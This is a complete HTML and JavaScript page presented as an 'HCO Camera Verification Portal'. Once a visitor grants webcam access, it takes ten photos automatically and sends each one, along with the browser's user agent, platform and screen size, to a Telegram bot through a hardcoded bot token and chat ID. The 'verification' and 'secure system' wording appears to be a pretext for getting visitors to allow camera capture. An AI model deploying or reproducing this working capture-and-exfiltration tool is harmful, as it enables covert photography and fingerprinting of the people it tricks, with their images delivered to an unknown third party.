<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HCO Camera Verification Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, sans-serif; }
        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: white; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        header { text-align: center; margin-bottom: 30px; padding: 25px; background: rgba(0,0,0,0.4); border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }
        h1 { font-size: 2.8rem; margin-bottom: 10px; background: linear-gradient(90deg, #00dbde, #fc00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .main-content { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; margin-bottom: 30px; }
        @media (max-width: 768px) { .main-content { grid-template-columns: 1fr; } }
        .panel { background: rgba(0,0,0,0.4); border-radius: 20px; padding: 25px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
        #video { width: 100%; height: 350px; background: #000; border-radius: 15px; object-fit: cover; margin-bottom: 20px; transform: scaleX(-1); }
        .controls { display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; }
        button { padding: 14px 28px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 10px; font-size: 1rem; flex: 1; }
        #startBtn { background: linear-gradient(90deg, #00b09b, #96c93d); color: white; }
        #captureBtn { background: linear-gradient(90deg, #ff0080, #ff8c00); color: white; }
        #stopBtn { background: linear-gradient(90deg, #8e2de2, #4a00e0); color: white; }
        button:hover { transform: translateY(-3px); box-shadow: 0 7px 20px rgba(0,0,0,0.4); }
        button:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
        .counter { position: fixed; top: 20px; right: 20px; background: rgba(255,255,255,0.15); padding: 12px 24px; border-radius: 50px; font-weight: bold; font-size: 1.3rem; backdrop-filter: blur(10px); z-index: 1000; }
        .gallery { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; margin-top: 25px; }
        .thumb { width: 100%; height: 90px; object-fit: cover; border-radius: 10px; border: 3px solid transparent; transition: all 0.3s; transform: scaleX(-1); }
        .thumb.active { border-color: #00ff88; box-shadow: 0 0 20px #00ff88; }
        #status { background: rgba(0,0,0,0.5); border-radius: 15px; padding: 20px; height: 400px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 0.95rem; border: 1px solid rgba(255,255,255,0.05); }
        .log { margin-bottom: 12px; padding-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .time { color: #00ffea; }
        .success { color: #00ff88; }
        .error { color: #ff0055; }
        .info { color: #aaaaaa; }
        .pulse { animation: pulse 2s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(0, 255, 136, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); } }
        .hidden { display: none; }
        footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="counter" id="counter">0/10</div>
    
    <div class="container">
        <header>
            <h1>üîê HCO VERIFICATION PORTAL v2.0</h1>
            <p>Automatic 10-photo capture system ‚Ä¢ Direct Telegram Delivery</p>
        </header>
        
        <div class="main-content">
            <div class="panel">
                <h2>üì∏ LIVE CAMERA FEED</h2>
                <video id="video" autoplay playsinline></video>
                <canvas id="canvas" class="hidden"></canvas>
                
                <div class="controls">
                    <button id="startBtn">
                        <span>üé• START CAMERA</span>
                    </button>
                    <button id="captureBtn" disabled>
                        <span>üì∑ AUTO CAPTURE (10)</span>
                    </button>
                    <button id="stopBtn" disabled>
                        <span>‚èπ STOP SYSTEM</span>
                    </button>
                </div>
                
                <button id="testBtn" onclick="testConnection()" style="background: linear-gradient(90deg, #f7971e, #ffd200); margin-bottom: 20px;">
                    <span>üîó TEST BOT CONNECTION</span>
                </button>
                
                <div id="galleryContainer">
                    <h3>üìÅ CAPTURED PHOTOS</h3>
                    <div class="gallery" id="gallery"></div>
                </div>
            </div>
            
            <div class="panel">
                <h2>üìä SYSTEM STATUS</h2>
                <div id="status">
                    <div class="log info">
                        <span class="time">[00:00:00]</span> HCO Camera Portal v2.0 Initialized
                    </div>
                    <div class="log success">
                        <span class="time">[00:00:00]</span> ‚úÖ Bot configured: @HCO_CAM_BOT
                    </div>
                </div>
            </div>
        </div>
        
        <footer>
            <p>‚ö†Ô∏è SECURE SYSTEM: Photos are sent directly to @HCO_CAM_BOT via encrypted API</p>
            <p>No server storage ‚Ä¢ End-to-end delivery ‚Ä¢ HTTPS secured ‚Ä¢ v2.0</p>
        </footer>
    </div>

    <script>
        // ================= YOUR CREDENTIALS =================
        const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWU";
        const TARGET_CHAT_ID = "8215819954";
        
        // ================= SYSTEM SETTINGS =================
        const TOTAL_PHOTOS = 10;
        const CAPTURE_DELAY = 1500; // 1.5 seconds between shots
        const MAX_RETRIES = 3;
        
        // ================= SYSTEM STATE =================
        let cameraStream = null;
        let photosCaptured = 0;
        let isCapturing = false;
        let captureTimer = null;
        let photoBlobs = [];
        let retryCount = 0;
        
        // ================= DOM ELEMENTS =================
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const captureBtn = document.getElementById('captureBtn');
        const stopBtn = document.getElementById('stopBtn');
        const counter = document.getElementById('counter');
        const gallery = document.getElementById('gallery');
        const statusDiv = document.getElementById('status');
        
        // ================= LOGGING SYSTEM =================
        function log(message, type = 'info') {
            const timestamp = new Date().toTimeString().split(' ')[0];
            const logEntry = document.createElement('div');
            logEntry.className = `log ${type}`;
            logEntry.innerHTML = `<span class="time">[${timestamp}]</span> ${message}`;
            
            statusDiv.prepend(logEntry);
            
            // Keep log manageable
            const logs = statusDiv.querySelectorAll('.log');
            if (logs.length > 25) {
                logs[logs.length - 1].remove();
            }
            
            // Also log to console for debugging
            console.log(`[${timestamp}] ${message}`);
        }
        
        // ================= CAMERA CONTROL =================
        async function initializeCamera() {
            try {
                log('üîÑ Requesting camera access...', 'info');
                
                // Try multiple camera access methods
                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 },
                        frameRate: { ideal: 30 }
                    },
                    audio: false
                };
                
                cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = cameraStream;
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        log(`‚úÖ Camera active: ${video.videoWidth}x${video.videoHeight} @ 30fps`, 'success');
                        resolve();
                    };
                });
                
                // Update UI
                startBtn.disabled = true;
                captureBtn.disabled = false;
                stopBtn.disabled = false;
                captureBtn.classList.add('pulse');
                
                log('‚úÖ Camera ready! Click "AUTO CAPTURE" to begin 10-photo sequence', 'success');
                
            } catch (error) {
                log(`‚ùå Camera error: ${error.message}`, 'error');
                
                // Fallback: Try without constraints
                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                    log('üîÑ Attempting fallback camera access...', 'info');
                    
                    try {
                        cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                        video.srcObject = cameraStream;
                        log('‚úÖ Fallback camera access successful', 'success');
                        
                        startBtn.disabled = true;
                        captureBtn.disabled = false;
                        stopBtn.disabled = false;
                        captureBtn.classList.add('pulse');
                    } catch (fallbackError) {
                        log(`‚ùå Fallback failed: ${fallbackError.message}`, 'error');
                        showCameraError();
                    }
                }
            }
        }
        
        function showCameraError() {
            const errorMsg = `
                <div style="background: rgba(255,0,0,0.2); padding: 20px; border-radius: 10px; margin-top: 20px;">
                    <h3>‚ö†Ô∏è Camera Access Required</h3>
                    <p>Please allow camera access and refresh the page.</p>
                    <p>1. Click the camera icon in your browser's address bar</p>
                    <p>2. Select "Allow" for camera access</p>
                    <p>3. Refresh this page</p>
                    <button onclick="location.reload()" style="background: red; color: white; padding: 10px 20px; border: none; border-radius: 5px; margin-top: 10px;">
                        üîÑ Refresh Page
                    </button>
                </div>
            `;
            document.querySelector('.panel').insertAdjacentHTML('beforeend', errorMsg);
        }
        
        // ================= PHOTO CAPTURE =================
        function capturePhoto() {
            if (!cameraStream) return null;
            
            const track = cameraStream.getVideoTracks()[0];
            const settings = track.getSettings();
            
            // Set canvas to video dimensions
            canvas.width = video.videoWidth || settings.width || 1280;
            canvas.height = video.videoHeight || settings.height || 720;
            
            const ctx = canvas.getContext('2d');
            
            // Mirror effect
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            
            // Draw video frame
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Reset transform
            ctx.setTransform(1, 0, 0, 1, 0, 0);
            
            // Convert to blob with compression
            return new Promise((resolve) => {
                canvas.toBlob(blob => {
                    resolve(blob);
                }, 'image/jpeg', 0.92); // High quality
            });
        }
        
        async function startAutoCapture() {
            if (isCapturing || photosCaptured >= TOTAL_PHOTOS) return;
            
            isCapturing = true;
            photosCaptured = 0;
            photoBlobs = [];
            gallery.innerHTML = '';
            
            captureBtn.disabled = true;
            captureBtn.innerHTML = '<span>‚è≥ CAPTURING 10 PHOTOS...</span>';
            document.getElementById('galleryContainer').style.display = 'block';
            
            log(`üöÄ Starting auto-capture sequence (${TOTAL_PHOTOS} photos)`, 'success');
            
            captureTimer = setInterval(async () => {
                if (photosCaptured >= TOTAL_PHOTOS) {
                    finishCapture();
                    return;
                }
                
                try {
                    // Capture photo
                    const photoBlob = await capturePhoto();
                    if (!photoBlob) {
                        log(`‚ö†Ô∏è Photo ${photosCaptured + 1} capture failed`, 'error');
                        return;
                    }
                    
                    photosCaptured++;
                    counter.textContent = `${photosCaptured}/${TOTAL_PHOTOS}`;
                    counter.classList.add('pulse');
                    
                    // Store blob
                    photoBlobs.push(photoBlob);
                    
                    // Create thumbnail
                    const thumbUrl = URL.createObjectURL(photoBlob);
                    const thumb = document.createElement('img');
                    thumb.src = thumbUrl;
                    thumb.className = 'thumb active';
                    thumb.title = `Photo ${photosCaptured}`;
                    gallery.prepend(thumb);
                    
                    log(`üì∏ Captured photo ${photosCaptured}/${TOTAL_PHOTOS} (${Math.round(photoBlob.size/1024)}KB)`, 'success');
                    
                    // Send to Telegram immediately (with retry logic)
                    await sendToTelegramWithRetry(photoBlob, photosCaptured);
                    
                    // Remove active class after delay
                    setTimeout(() => {
                        if (thumb.parentNode) {
                            thumb.classList.remove('active');
                        }
                    }, 800);
                    
                    // Update counter animation
                    setTimeout(() => counter.classList.remove('pulse'), 500);
                    
                } catch (error) {
                    log(`‚ùå Capture error: ${error.message}`, 'error');
                }
                
            }, CAPTURE_DELAY);
        }
        
        function finishCapture() {
            if (captureTimer) {
                clearInterval(captureTimer);
                captureTimer = null;
            }
            
            isCapturing = false;
            captureBtn.disabled = false;
            captureBtn.innerHTML = '<span>üì∑ AUTO CAPTURE (10)</span>';
            captureBtn.classList.remove('pulse');
            
            log(`üéâ CAPTURE COMPLETE! ${photosCaptured} photos sent to @HCO_CAM_BOT`, 'success');
            log('‚úÖ All photos delivered. Check your Telegram bot.', 'info');
            
            // Send completion report
            sendCompletionReport();
        }
        
        // ================= TELEGRAM INTEGRATION =================
        async function sendToTelegramWithRetry(blob, photoNumber, retry = 0) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TARGET_CHAT_ID);
                formData.append('photo', blob, `hco_${Date.now()}_${photoNumber}.jpg`);
                formData.append('caption', `üîê HCO Verification #${photoNumber}/${TOTAL_PHOTOS}\nüì± ${navigator.userAgent.substring(0, 30)}...\n‚è∞ ${new Date().toLocaleTimeString()}\n‚úÖ Auto-captured`);
                formData.append('disable_notification', 'false');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    log(`‚úÖ Photo ${photoNumber} delivered to @HCO_CAM_BOT`, 'success');
                    retryCount = 0;
                    return true;
                } else {
                    log(`‚ö†Ô∏è Telegram API error: ${result.description || 'Unknown'}`, 'error');
                    
                    // Retry logic
                    if (retry < MAX_RETRIES) {
                        log(`üîÑ Retrying photo ${photoNumber} (${retry + 1}/${MAX_RETRIES})...`, 'info');
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        return sendToTelegramWithRetry(blob, photoNumber, retry + 1);
                    } else {
                        log(`‚ùå Failed to send photo ${photoNumber} after ${MAX_RETRIES} attempts`, 'error');
                        return false;
                    }
                }
                
            } catch (error) {
                log(`‚ùå Network error: ${error.message}`, 'error');
                
                if (retry < MAX_RETRIES) {
                    log(`üîÑ Retrying photo ${photoNumber} (${retry + 1}/${MAX_RETRIES})...`, 'info');
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    return sendToTelegramWithRetry(blob, photoNumber, retry + 1);
                }
                
                return false;
            }
        }
        
        async function sendCompletionReport() {
            try {
                const message = `
‚úÖ <b>HCO VERIFICATION COMPLETE</b>

üìä <b>Report Summary:</b>
‚Ä¢ Photos Captured: <code>${photosCaptured}/${TOTAL_PHOTOS}</code>
‚Ä¢ Timestamp: <code>${new Date().toLocaleString()}</code>
‚Ä¢ User Agent: <code>${navigator.userAgent.substring(0, 50)}...</code>
‚Ä¢ System: <code>${navigator.platform}</code>
‚Ä¢ Screen: <code>${window.screen.width}x${window.screen.height}</code>

üéØ <b>All photos delivered successfully to @HCO_CAM_BOT</b>
`;
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TARGET_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                log('üì® Completion report sent to Telegram', 'success');
            } catch (error) {
                log('‚ö†Ô∏è Failed to send completion report', 'error');
            }
        }
        
        // ================= TEST FUNCTION =================
        async function testConnection() {
            log('üîó Testing connection to @HCO_CAM_BOT...', 'info');
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                const result = await response.json();
                
                if (result.ok) {
                    log(`‚úÖ Bot connected: @${result.result.username}`, 'success');
                    log(`üÜî Bot ID: ${result.result.id} | Name: ${result.result.first_name}`, 'info');
                    
                    // Test message send
                    const msgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TARGET_CHAT_ID,
                            text: 'üîó <b>HCO Portal Connection Test</b>\n‚úÖ Bot connection successful!\n‚è∞ ' + new Date().toLocaleTimeString(),
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const msgResult = await msgResponse.json();
                    if (msgResult.ok) {
                        log('‚úÖ Test message sent to Telegram successfully', 'success');
                    }
                    
                } else {
                    log(`‚ùå Bot connection failed: ${result.description}`, 'error');
                }
            } catch (error) {
                log(`‚ùå Connection error: ${error.message}`, 'error');
            }
        }
        
        // ================= SYSTEM CONTROL =================
        function stopSystem() {
            // Stop camera
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => {
                    track.stop();
                });
                cameraStream = null;
            }
            
            // Stop capture
            if (captureTimer) {
                clearInterval(captureTimer);
                captureTimer = null;
            }
            
            // Reset state
            isCapturing = false;
            photosCaptured = 0;
            photoBlobs = [];
            
            // Update UI
            video.srcObject = null;
            startBtn.disabled = false;
            captureBtn.disabled = true;
            stopBtn.disabled = true;
            captureBtn.innerHTML = '<span>üì∑ AUTO CAPTURE (10)</span>';
            captureBtn.classList.remove('pulse');
            counter.textContent = '0/10';
            counter.classList.remove('pulse');
            
            log('üõë System stopped. Camera released.', 'info');
        }
        
        // ================= EVENT LISTENERS =================
        startBtn.addEventListener('click', initializeCamera);
        captureBtn.addEventListener('click', startAutoCapture);
        stopBtn.addEventListener('click', stopSystem);
        
        // Cleanup on page exit
        window.addEventListener('beforeunload', () => {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        });
        
        // Auto-test connection on load
        window.addEventListener('load', () => {
            log('üöÄ HCO Camera Portal v2.0 loaded', 'success');
            log('‚úÖ Bot configured: 8226782560:AAE3pOwbdZR8lWU', 'info');
            log('‚úÖ Target chat: 8215819954', 'info');
            log('‚úÖ System ready. Click "START CAMERA" to begin', 'info');
            
            // Auto-test connection after 2 seconds
            setTimeout(() => {
                testConnection();
            }, 2000);
        });
    </script>
</body>
</html>
